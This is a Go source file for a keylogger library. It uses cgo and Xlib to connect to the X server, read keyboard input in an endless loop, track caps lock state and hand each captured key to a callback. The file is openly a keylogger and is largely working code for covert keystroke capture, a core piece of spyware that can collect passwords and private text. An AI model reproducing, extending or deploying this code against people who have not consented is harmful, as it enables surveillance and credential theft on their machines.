package kl

/*
#cgo CFLAGS: -std=c11
#cgo LDFLAGS: -lX11

#include <stdlib.h>
#include "keylogger.h"
*/
import "C"
import (
	"errors"
	"os"
	"strings"
	"unsafe"
)

// common errors
var (
	ErrorOpen  = errors.New("could not open xserver connection")
	ErrorClose = errors.New("xserver connection could not be closed")
)

// InitKeylogger will initialize connection with the
// XServer to start reading keyboard input,
// if it works no error will be returned
func InitKeylogger() (ret error) {
	dcstr := C.CString(os.Getenv("DISPLAY"))
	defer C.free(unsafe.Pointer(dcstr))

	if uint(C.__init_kelogger(dcstr)) == 0 {
		ret = ErrorOpen
	}

	return
}

// DestroyKeylogger Will close connection with the
// XServer, if it works, not error will be returned
func DestroyKeylogger() (ret error) {
	if uint(C.__destroy_kelogger()) == 0 {
		ret = ErrorClose
	}

	return
}

// StartReadingInput method used to start reading
// input from keyboard
func StartReadingInput(fn func(string)) {
	var s string // current string
	var l string // last string
	var capsLockActivated bool

	canGoToUppercase := func(s string) bool {
		return capsLockActivated && !isCapsLock(s) && !isSpace(s)
	}

	for {
		s = C.GoString(C.__start_reading_input())

		if canGoToUppercase(s) {
			s = strings.ToUpper(s)
		}

		if s != l {
			if isCapsLock(s) {
				capsLockActivated = !capsLockActivated
			} else {
				if s != "" {
					fn(getKey(s))
				}
			}

		}

		l = s
	}
}
